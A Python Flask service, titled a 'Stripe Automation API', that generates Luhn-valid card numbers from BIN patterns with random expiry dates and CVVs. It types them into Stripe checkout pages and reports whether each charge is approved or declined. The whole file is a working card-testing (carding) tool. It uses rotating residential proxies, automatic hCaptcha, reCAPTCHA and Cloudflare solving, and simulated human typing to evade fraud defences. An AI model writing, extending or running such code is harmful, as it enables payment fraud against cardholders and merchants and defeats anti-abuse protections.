import os
import asyncio
import json
import random
import re
import time
import requests
from datetime import datetime
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
from playwright._impl._errors import TargetClosedError
from flask import Flask, request, jsonify
from dotenv import load_dotenv
from collections import deque

load_dotenv()

CONFIG = {
    "RUN_LOCAL": os.getenv('RUN_LOCAL', 'false').lower() == 'true',
    "BROWSERLESS_API_KEY": os.getenv('BROWSERLESS_API_KEY'),
    "PROXY_COUNTRY": os.getenv('PROXY_COUNTRY', 'us'),  # us, uk, ca, au, etc.
    "RESPONSE_TIMEOUT_SECONDS": 50,
    "RETRY_DELAY": 2000,
    "RATE_LIMIT_REQUESTS": 5,
    "RATE_LIMIT_WINDOW": 60,
    "MAX_RETRIES": 2,
    "BROWSERLESS_TIMEOUT": 60000
}

app = Flask(__name__)
request_timestamps = deque(maxlen=CONFIG["RATE_LIMIT_REQUESTS"])

# Available proxy countries for rotation
PROXY_COUNTRIES = ['us', 'uk', 'ca', 'au', 'de', 'fr', 'nl', 'es', 'it', 'se']
current_country_index = 0

def get_next_proxy_country():
    """Get next proxy country for IP rotation"""
    global current_country_index
    country = PROXY_COUNTRIES[current_country_index % len(PROXY_COUNTRIES)]
    current_country_index += 1
    return country

def rate_limit_check():
    now = time.time()
    while request_timestamps and request_timestamps[0] < now - CONFIG["RATE_LIMIT_WINDOW"]:
        request_timestamps.popleft()
    
    if len(request_timestamps) >= CONFIG["RATE_LIMIT_REQUESTS"]:
        oldest = request_timestamps[0]
        wait_time = CONFIG["RATE_LIMIT_WINDOW"] - (now - oldest)
        return False, wait_time
    
    request_timestamps.append(now)
    return True, 0

def create_browserless_session(target_url, proxy_country=None):
    """Create Browserless session with BrowserQL and get WebSocket endpoint"""
    
    if not CONFIG["BROWSERLESS_API_KEY"]:
        raise Exception("BROWSERLESS_API_KEY not configured")
    
    if not proxy_country:
        proxy_country = get_next_proxy_country()
    
    # Browserless BrowserQL endpoint
    endpoint = "https://production-sfo.browserless.io/chrome/bql"
    
    # Query parameters
    query_params = {
        "token": CONFIG["BROWSERLESS_API_KEY"],
        "proxy": "residential",  # Use residential proxy
        "proxySticky": "true",   # Keep same IP for session
        "proxyCountry": proxy_country,  # Country selection
        "humanlike": "true",     # Human-like behavior
        "blockConsentModals": "true",  # Auto-close cookie popups
        "timeout": CONFIG["BROWSERLESS_TIMEOUT"]
    }
    
    headers = {
        "Content-Type": "application/json",
    }
    
    # BrowserQL mutation - navigate, solve captcha, and get reconnect endpoint
    payload = {
        "query": f"""
mutation SetupSession {{
  viewport(width: 1920, height: 1080) {{
    width
    height
    time
  }}
  
  reject(type: [stylesheet, font]) {{
    enabled
    time
  }}
  
  goto(url: "{target_url}", waitUntil: domContentLoaded) {{
    status
  }}
  
  wait(time: 3000) {{
    time
  }}
  
  verify(type: hcaptcha) {{
    solved
  }}
  
  verify(type: recaptcha) {{
    solved
  }}
  
  verify(type: cloudflare) {{
    solved
  }}
  
  reconnect(timeout: 300000) {{
    browserWSEndpoint
  }}
}}
        """,
        "operationName": "SetupSession",
    }
    
    try:
        print(f"[BQL] Creating session with proxy country: {proxy_country.upper()}")
        response = requests.post(endpoint, params=query_params, headers=headers, json=payload, timeout=60)
        response.raise_for_status()
        
        result = response.json()
        
        if result.get('errors'):
            raise Exception(f"BQL errors: {result['errors']}")
        
        data = result.get('data', {})
        reconnect_data = data.get('reconnect', {})
        ws_endpoint = reconnect_data.get('browserWSEndpoint')
        
        if not ws_endpoint:
            raise Exception("No WebSocket endpoint returned")
        
        print(f"[BQL] ✓ Session created")
        print(f"[BQL] ✓ Captchas auto-solved")
        print(f"[BQL] ✓ WebSocket endpoint ready")
        
        return {
            'ws_endpoint': ws_endpoint,
            'proxy_country': proxy_country,
            'captcha_solved': True,
            'bql_result': data
        }
        
    except requests.exceptions.RequestException as e:
        raise Exception(f"Failed to create Browserless session: {str(e)}")

def luhn_algorithm(number_str):
    total = 0
    reverse_digits = number_str[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if (i % 2) == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def complete_luhn(base):
    for d in range(10):
        candidate = base + str(d)
        if luhn_algorithm(candidate):
            return candidate
    return None

def get_card_length(bin_str):
    first_two = bin_str[:2] if len(bin_str) >= 2 else ""
    return 15 if first_two in ['34', '37'] else 16

def get_cvv_length(card_number):
    return 4 if len(card_number) == 15 else 3

def random_digit():
    return str(random.randint(0, 9))

def generate_card_from_pattern(pattern):
    clean_pattern = re.sub(r'[^0-9x]', '', pattern, flags=re.IGNORECASE)
    card_length = get_card_length(clean_pattern.replace('x', '0'))
    
    result = ''
    for char in clean_pattern:
        if len(result) >= card_length - 1:
            break
        result += random_digit() if char.lower() == 'x' else char
    
    while len(result) < card_length - 1:
        result += random_digit()
    
    result = result[:card_length - 1]
    return complete_luhn(result) or result + '0'

def process_card_with_placeholders(number, month, year, cvv):
    processed_number = generate_card_from_pattern(number) if 'x' in number.lower() else number
    processed_month = str(random.randint(1, 12)).zfill(2) if 'x' in month.lower() else month.zfill(2)
    
    current_year = datetime.now().year
    if 'x' in year.lower():
        processed_year = str(random.randint(current_year + 1, current_year + 6))
    elif len(year) == 2:
        processed_year = '20' + year
    else:
        processed_year = year
    
    cvv_length = get_cvv_length(processed_number)
    processed_cvv = ''.join([random_digit() for _ in range(cvv_length)]) if 'x' in cvv.lower() else cvv
    
    return {
        "number": processed_number,
        "month": processed_month,
        "year": processed_year,
        "cvv": processed_cvv
    }

def process_card_input(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        return None
    return process_card_with_placeholders(*parts)

def generate_random_name():
    first_names = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Avery', 'Quinn', 'Sage', 'Parker']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

class StripeResponseAnalyzer:
    @staticmethod
    def is_stripe_endpoint(url):
        return any(domain in url.lower() for domain in ['stripe.com', 'stripe.network'])
    
    @staticmethod
    def is_payment_critical_endpoint(url):
        critical = [
            '/v1/payment_intents',
            '/v1/payment_pages',
            '/v1/tokens',
            '/v1/payment_methods',
            '/confirm',
            '/v1/charges'
        ]
        return any(endpoint in url.lower() for endpoint in critical)
    
    @staticmethod
    def analyze_response(url, status, body_text, result_dict):
        try:
            data = json.loads(body_text)
        except:
            return
        
        result_dict["raw_responses"].append({
            "url": url,
            "status": status,
            "data": data,
            "timestamp": datetime.now().isoformat()
        })
        
        if StripeResponseAnalyzer.is_payment_critical_endpoint(url):
            print(f"[API] {url[:60]}... [{status}]")
        
        if data.get('success_url'):
            result_dict["success_url"] = data['success_url']
            print(f"[SUCCESS URL] Found")
        
        is_payment_success = (
            data.get('status') in ['succeeded', 'success', 'requires_capture', 'processing', 'complete'] or
            data.get('payment_intent', {}).get('status') in ['succeeded', 'success', 'requires_capture', 'processing'] or
            data.get('payment_status') in ['paid', 'complete'] or
            data.get('outcome', {}).get('type') == 'authorized' or
            data.get('status') == 'complete' and 'payment_intent' in data or
            data.get('paid') == True or
            (data.get('object') == 'setup_intent' and data.get('status') == 'succeeded')
        )
        
        if is_payment_success:
            result_dict["payment_confirmed"] = True
            result_dict["success"] = True
            result_dict["message"] = f"Payment {data.get('status', 'succeeded')}"
            result_dict["payment_intent_id"] = (
                data.get('id') or 
                data.get('payment_intent', {}).get('id') or
                data.get('payment_intent')
            )
            print(f"[✓ PAYMENT CONFIRMED] {data.get('status')}")
            return
        
        if status == 200 and data.get('id', '').startswith('tok_'):
            result_dict["token_created"] = True
            result_dict["token_id"] = data.get('id')
            print(f"[TOKEN] Created")
        
        if status == 200 and data.get('id', '').startswith('pm_'):
            result_dict["payment_method_created"] = True
            result_dict["payment_method_id"] = data.get('id')
            print(f"[PM] Created")
        
        if status == 200 and data.get('id', '').startswith('pi_'):
            result_dict["payment_intent_created"] = True
            result_dict["payment_intent_id"] = data.get('id')
            result_dict["client_secret"] = data.get('client_secret')
            print(f"[PI] {data.get('status')}")
        
        error = data.get('error') or data.get('payment_intent', {}).get('last_payment_error')
        if error:
            decline_code = error.get('decline_code') or error.get('code') or "unknown"
            error_message = error.get('message') or "Transaction error"
            result_dict["error"] = error_message
            result_dict["decline_code"] = decline_code
            result_dict["success"] = False
            print(f"[ERROR] {decline_code}")
        
        if data.get('status') == 'requires_action' or data.get('next_action'):
            result_dict["requires_3ds"] = True
            print("[3DS] Required")

async def safe_wait(page, ms):
    try:
        await page.wait_for_timeout(ms)
        return True
    except:
        return False

async def run_stripe_automation(url, cc_string, email=None, proxy_country=None):
    card = process_card_input(cc_string)
    if not card:
        return {"error": "Invalid card format. Use: number|month|year|cvv"}
    
    email = email or f"test{random.randint(1000,9999)}@example.com"
    random_name = generate_random_name()
    
    print(f"\n{'='*80}")
    print(f"[START] {datetime.now().strftime('%H:%M:%S')}")
    print(f"[CARD] {card['number']} | {card['month']}/{card['year']}")
    print(f"[EMAIL] {email}")
    print('='*80)
    
    stripe_result = {
        "status": "pending",
        "raw_responses": [],
        "payment_confirmed": False,
        "token_created": False,
        "payment_method_created": False,
        "payment_intent_created": False,
        "success_url": None,
        "requires_3ds": False
    }
    
    analyzer = StripeResponseAnalyzer()
    browserless_session = None
    
    async with async_playwright() as p:
        browser = None
        context = None
        page = None
        payment_submitted = False
        
        try:
            if CONFIG["RUN_LOCAL"]:
                print("[BROWSER] Local mode")
                browser = await p.chromium.launch(
                    headless=False,
                    slow_mo=100,
                    args=['--disable-blink-features=AutomationControlled']
                )
                context = await browser.new_context(
                    viewport={'width': 1920, 'height': 1080},
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
                )
            else:
                print("[BROWSERLESS] Creating session with BrowserQL...")
                
                # Create Browserless session with captcha solving
                browserless_session = create_browserless_session(url, proxy_country)
                ws_endpoint = browserless_session['ws_endpoint']
                
                stripe_result["proxy_country"] = browserless_session['proxy_country']
                stripe_result["captcha_solved"] = browserless_session['captcha_solved']
                
                print(f"[BROWSERLESS] Connecting to session...")
                
                # Connect to the WebSocket endpoint
                browser = await p.chromium.connect_over_cdp(ws_endpoint)
                
                # Get existing context (BrowserQL already created one)
                contexts = browser.contexts
                if contexts:
                    context = contexts[0]
                else:
                    context = await browser.new_context()
                
                print(f"[BROWSERLESS] ✓ Connected with proxy: {browserless_session['proxy_country'].upper()}")
            
            # Get or create page
            pages = context.pages
            if pages:
                page = pages[0]
            else:
                page = await context.new_page()
            
            print("[PAGE] ✓ Ready")
            
            # Response capture
            async def capture_response(response):
                try:
                    if not analyzer.is_stripe_endpoint(response.url):
                        return
                    
                    content_type = response.headers.get('content-type', '')
                    if 'application/json' in content_type:
                        try:
                            body = await response.body()
                            text = body.decode('utf-8', errors='ignore')
                            analyzer.analyze_response(response.url, response.status, text, stripe_result)
                        except:
                            pass
                except:
                    pass
            
            page.on("response", capture_response)
            
            # Page is already loaded by BrowserQL, just wait a bit
            print("[WAIT] Page already loaded by BrowserQL...")
            await safe_wait(page, 2000)
            
            # Fill email
            print("[FILL] Email...")
            email_filled = False
            try:
                for selector in ['input[type="email"]', 'input[name="email"]', '#email']:
                    elements = await page.query_selector_all(selector)
                    for element in elements:
                        if await element.is_visible():
                            await element.click()
                            await element.fill(email)
                            email_filled = True
                            print(f"[EMAIL] ✓")
                            break
                    if email_filled:
                        break
            except:
                pass
            
            await safe_wait(page, 1000)
            
            # Fill card
            print("[FILL] Card...")
            filled_status = {"card": False, "expiry": False, "cvc": False}
            
            try:
                frames = page.frames
                stripe_frames = [f for f in frames if 'stripe' in f.url.lower()]
                print(f"[FRAMES] {len(stripe_frames)} Stripe frames")
                
                for frame in stripe_frames:
                    try:
                        if not filled_status["card"]:
                            for inp in await frame.query_selector_all('input'):
                                try:
                                    ph = (await inp.get_attribute('placeholder') or '').lower()
                                    if 'card number' in ph or '1234' in ph:
                                        await inp.click()
                                        for digit in card['number']:
                                            await inp.type(digit, delay=random.randint(50, 100))
                                        filled_status["card"] = True
                                        print(f"[CARD] ✓")
                                        break
                                except:
                                    continue
                        
                        if not filled_status["expiry"]:
                            for inp in await frame.query_selector_all('input'):
                                try:
                                    ph = (await inp.get_attribute('placeholder') or '').lower()
                                    if 'mm' in ph or 'expir' in ph:
                                        await inp.click()
                                        exp_string = f"{card['month']}{card['year'][-2:]}"
                                        for char in exp_string:
                                            await inp.type(char, delay=random.randint(50, 100))
                                        filled_status["expiry"] = True
                                        print(f"[EXPIRY] ✓")
                                        break
                                except:
                                    continue
                        
                        if not filled_status["cvc"]:
                            for inp in await frame.query_selector_all('input'):
                                try:
                                    ph = (await inp.get_attribute('placeholder') or '').lower()
                                    if 'cvc' in ph or 'cvv' in ph or 'security' in ph:
                                        await inp.click()
                                        for digit in card['cvv']:
                                            await inp.type(digit, delay=random.randint(50, 100))
                                        filled_status["cvc"] = True
                                        print(f"[CVC] ✓")
                                        break
                                except:
                                    continue
                    except:
                        continue
            except TargetClosedError:
                return {"error": "Browser closed during form fill"}
            
            print(f"[STATUS] Card:{filled_status['card']} Exp:{filled_status['expiry']} CVC:{filled_status['cvc']}")
            
            await safe_wait(page, 3000)
            
            # Submit
            print("[SUBMIT]...")
            try:
                for selector in ['button[type="submit"]:visible', 'button.SubmitButton:visible']:
                    try:
                        btn = page.locator(selector).first
                        if await btn.count() > 0:
                            await btn.click()
                            payment_submitted = True
                            print("[SUBMIT] ✓")
                            break
                    except:
                        continue
                
                if not payment_submitted:
                    await page.keyboard.press('Enter')
                    payment_submitted = True
                    print("[SUBMIT] ✓ (Enter)")
            except:
                pass
            
            print("[WAIT] Processing (10s)...")
            await safe_wait(page, 10000)
            
            print("[MONITOR] Waiting for response...")
            start_time = time.time()
            max_wait = CONFIG["RESPONSE_TIMEOUT_SECONDS"]
            last_count = 0
            
            while time.time() - start_time < max_wait:
                current_count = len(stripe_result['raw_responses'])
                if current_count > last_count:
                    print(f"[MONITOR] {current_count} responses")
                    last_count = current_count
                
                if stripe_result.get("payment_confirmed"):
                    print("[✓ SUCCESS]")
                    break
                
                if stripe_result.get("error"):
                    print(f"[ERROR] {stripe_result.get('decline_code')}")
                    break
                
                if stripe_result.get("requires_3ds"):
                    print("[3DS]")
                    break
                
                try:
                    current_url = page.url
                    success_url = stripe_result.get("success_url")
                    
                    if success_url and current_url.startswith(success_url):
                        stripe_result["payment_confirmed"] = True
                        stripe_result["success"] = True
                        print("[✓ REDIRECT]")
                        break
                    
                    if any(x in current_url.lower() for x in ['success', 'thank-you', 'complete', 'confirmed']):
                        stripe_result["payment_confirmed"] = True
                        stripe_result["success"] = True
                        print("[✓ SUCCESS PAGE]")
                        break
                except:
                    pass
                
                await asyncio.sleep(0.5)
            
            print(f"[DONE] {len(stripe_result['raw_responses'])} responses")
            
            # Build response
            if stripe_result.get("payment_confirmed"):
                return {
                    "success": True,
                    "message": stripe_result.get("message", "Payment successful"),
                    "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
                    "payment_intent_id": stripe_result.get("payment_intent_id"),
                    "token_id": stripe_result.get("token_id"),
                    "payment_method_id": stripe_result.get("payment_method_id"),
                    "proxy_country": stripe_result.get("proxy_country"),
                    "captcha_solved": stripe_result.get("captcha_solved"),
                    "raw_responses": stripe_result["raw_responses"]
                }
            elif stripe_result.get("requires_3ds"):
                return {
                    "success": False,
                    "requires_3ds": True,
                    "message": "3D Secure authentication required",
                    "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
                    "raw_responses": stripe_result["raw_responses"]
                }
            elif stripe_result.get("error"):
                return {
                    "success": False,
                    "error": stripe_result["error"],
                    "decline_code": stripe_result.get("decline_code"),
                    "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
                    "raw_responses": stripe_result["raw_responses"]
                }
            else:
                return {
                    "success": False,
                    "message": "Payment not confirmed",
                    "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
                    "details": {
                        "email_filled": email_filled,
                        "card_filled": filled_status,
                        "payment_submitted": payment_submitted,
                        "responses": len(stripe_result["raw_responses"])
                    },
                    "raw_responses": stripe_result["raw_responses"]
                }
                
        except Exception as e:
            print(f"[EXCEPTION] {str(e)}")
            import traceback
            traceback.print_exc()
            return {
                "error": f"Automation failed: {str(e)}",
                "raw_responses": stripe_result.get("raw_responses", [])
            }
            
        finally:
            if page:
                try:
                    await page.close()
                except:
                    pass
            if context and CONFIG["RUN_LOCAL"]:
                try:
                    await context.close()
                except:
                    pass
            if browser:
                try:
                    await browser.close()
                except:
                    pass
            print("[CLEANUP] ✓")

@app.route('/')
def home():
    return jsonify({
        "service": "Stripe Automation API",
        "version": "4.0",
        "provider": "Browserless BrowserQL",
        "status": "online",
        "features": {
            "residential_proxies": True,
            "auto_captcha_solving": True,
            "proxy_countries": PROXY_COUNTRIES,
            "captcha_types": ["hCaptcha", "reCAPTCHA", "Cloudflare"],
            "ip_rotation": True
        },
        "endpoints": {
            "/hrkXstripe": "Main automation endpoint",
            "/status": "Status check"
        }
    })

@app.route('/hrkXstripe', methods=['GET'])
def stripe_endpoint():
    can_proceed, wait_time = rate_limit_check()
    if not can_proceed:
        return jsonify({
            "error": "Rate limit exceeded",
            "retry_after": f"{wait_time:.1f}s"
        }), 429
    
    url = request.args.get('url')
    cc = request.args.get('cc')
    email = request.args.get('email')
    proxy_country = request.args.get('country')  # Optional: us, uk, ca, etc.
    
    print(f"\n{'='*80}")
    print(f"[REQUEST] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[URL] {url[:80] if url else 'None'}...")
    print(f"[CC] {cc}")
    if proxy_country:
        print(f"[COUNTRY] {proxy_country.upper()}")
    print('='*80)
    
    if not url or not cc:
        return jsonify({"error": "Missing required parameters: url and cc"}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        result = loop.run_until_complete(run_stripe_automation(url, cc, email, proxy_country))
        print(f"[RESULT] {'✓' if result.get('success') else '✗'}")
        return jsonify(result), 200 if result.get('success') else 400
    except Exception as e:
        print(f"[SERVER ERROR] {e}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": f"Server error: {str(e)}"}), 500
    finally:
        loop.close()

@app.route('/status', methods=['GET'])
def status_endpoint():
    return jsonify({
        "status": "online",
        "version": "4.0-browserql",
        "provider": "Browserless BrowserQL",
        "mode": "Browserless" if not CONFIG['RUN_LOCAL'] else "Local",
        "browserless_configured": bool(CONFIG.get("BROWSERLESS_API_KEY")),
        "features": {
            "residential_proxies": True,
            "auto_captcha_solving": True,
            "available_countries": PROXY_COUNTRIES,
            "captcha_support": ["hCaptcha", "reCAPTCHA", "Cloudflare"],
            "humanlike_behavior": True
        },
        "timestamp": datetime.now().isoformat()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    print("="*80)
    print("[SERVER] Stripe Automation v4.0 - BrowserQL Edition")
    print(f"[PORT] {port}")
    print(f"[PROVIDER] Browserless BrowserQL")
    
    if not CONFIG['RUN_LOCAL'] and not CONFIG.get('BROWSERLESS_API_KEY'):
        print("[WARNING] BROWSERLESS_API_KEY not set!")
    
    print("\n[FEATURES]")
    print("  ✓ Residential proxies (Browserless)")
    print("  ✓ Auto captcha solving (hCaptcha, reCAPTCHA, Cloudflare)")
    print("  ✓ IP rotation via proxy countries")
    print(f"  ✓ Available countries: {', '.join(PROXY_COUNTRIES[:5])}...")
    print("  ✓ Human-like behavior")
    print("  ✓ Auto-block cookie popups")
    print("  ✓ Payment confirmation detection")
    print("\n[DOCS] https://docs.browserless.io/browserql")
    print("="*80)
    
    app.run(host='0.0.0.0', port=port, debug=False)
